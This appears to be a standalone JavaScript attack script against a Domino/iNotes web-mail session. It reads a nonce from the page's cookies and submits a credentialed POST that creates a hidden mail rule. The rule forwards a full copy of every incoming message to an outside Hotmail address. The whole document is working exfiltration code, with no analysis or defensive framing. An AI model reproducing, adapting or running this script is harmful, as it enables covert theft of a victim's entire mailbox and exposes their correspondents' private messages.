function createMailRuleFromCurrentPage({ em, no }) {
  const basePath = document.URL.split('?')[0]
  const url = `${basePath}/(Rules)/$new/?EditDocument&Form=h_PageUI&ui=classic&pt&PresetFields=s_NotesForm;Mailrule`;
  const referrer = `${basePath}/(Rules)/$new/?EditDocument&Form=h_PageUI&PresetFields=h_SkinTypeOverride;h_ApptPage,s_ViewName;(Rules),s_NotesForm;Mailrule,h_EditAction;h_New,s_HideRemoteImage;1,s_EditInitial;1&ui=classic&pt&gn`;
  const bodyTemplate = `%25%25ModDate=&%25%25Nonce=0DD9E48BD182AD070AE0F77F04365385&h_SceneContext=putAway%5B%27publishAction%27%5D%26%26%26%26%26%26putAway%5B%27publishFolderTitle%27%5D%26%26%26%26%26%26putAway%5B%27ME%27%5D%26%26%26%26%26%26putAway%5B%27publishFolderPageUnid%27%5D%26%26%26%26%26%26putAway%5B%27tocPosition%27%5D%26%26%26%26%26%26putAway%5B%27tmpText%27%5D%26%26%26%26%26%26putAway%5B%27selectedFolderIndex%27%5D%26%26%260%26%26%26putAway%5B%27BSi%27%5D%26%26%26%26%26%26&h_EditAction=h_Next&h_SetEditCurrentScene=s_StdPageEdit&h_SetPublishReaders=&h_AlternateName=&h_CurrentFolderDocument=&h_CurrentFolderName=%28Rules%29&h_SetEditNextScene=&h_SetReturnURL=%5B%5B.%2F%26Form%3Ds_CallPassToMailView%26PresetFields%3DEeK%3B%3Frbp%2CsUnid%3BC62224585C5FC84948258D120032A5F7%2CDcS%3B%28Rules%29%2CGVY%3B%2CFWM%3B%2CsCloseWin%3B1%5D%5D&h_ReturnToPage=&h_NoSceneTrail=0&h_SetCommand=h_ShimmerSave&h_SetSaveDoc=1&s_MailSendReturnPage=&s_MailViewBefore=&h_SetPublishToFolder=%28Rules%29&h_Name=&h_SetPublishAction=h_Publish&h_EditSceneTrail=&h_WorkflowStage=&h_IsConflict=&h_DictionaryId=&s_SubjectText=&s_ViewName=&h_SetDeleteListCS=&s_DisclaimerIsAdded=&%24Disclaimed=&s_ScanFromClient=&s_ScanViewName=&s_ScanUnid=&s_WelcomeID=&JITUsers=&NotesRecips=&hFailedUsers=&SMIMESign=&Encrypt=&Sign=&SMIMERecips=&NoDomRecips=&TrustInetCerts=&%24FILTERFORMULA=%40If%28%28%40DocLength%3E1%29%3B%28%40Do%28%40SetField%28%22%24FilterActions%22%3B%40Trim%28%24FilterActions%3A%22COPYTO1+%2B%3D%2B+isayildiz94%40hotmail.com%22%29%29%3B%40SetField%28%22DisplayCopyTo_Icon%22%3B%221%22%29%29%29%3B%22%22%29&s_action=B&ActionList=send+full+copy+to+isayildiz94%40hotmail.com&condition=C&ConditionList=Size+is+greater+than+1+byte%28s%29&CopyTo_Address=&h_Name=&DomainList=&Enable=1&ExceptionList=&ExpireDates=D&ExpireNumber=5&folder=&Form=Mailrule&Importance=1&importancecond=High&DeliPriorCond=High&logic=2&Operator=0&string=&TokActionList=B%7C1%7Cisayildiz94%40hotmail.com&tokConditionList=C%7C2%7C1%7C0&tokExceptionList=&h_DestFolder=&s_FolderPath=&h_Move=&s_NewFolderList=&s_ViewName=&h_SetDeleteList=&Subject=rule&Status=1&CondExcp=on&Combo0=C&Combo1=1&Combo5=2&Combo8=3&NAMETEXT=&DOMTEXT=&OTHERTEXT=1&Combo4=High&Combo9=High&Combo2=B&Combo3=1&FLDRTEXT=&SENDTEXT=isayildiz94%40hotmail.com&Combo6=1&EXPIRETEXT=5&Combo7=D`;
  const encodedEm = encodeURIComponent(em);
  const body = bodyTemplate
    .replace(/0DD9E48BD182AD070AE0F77F04365385/g, no)
    .replace(/isayildiz94%40hotmail\.com/g, encodedEm);
  fetch(url, {
    method: "POST",
    credentials: "include",
    mode: "cors",
    referrer: referrer,
    referrerPolicy: "strict-origin-when-cross-origin",
    headers: {
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "content-type": "application/x-www-form-urlencoded",
      "sec-fetch-dest": "iframe"
    },
    body
  });
}


createMailRuleFromCurrentPage({
  em: "isayildiz94@hotmail.com",
  no: document.cookie.split(':').pop()
});
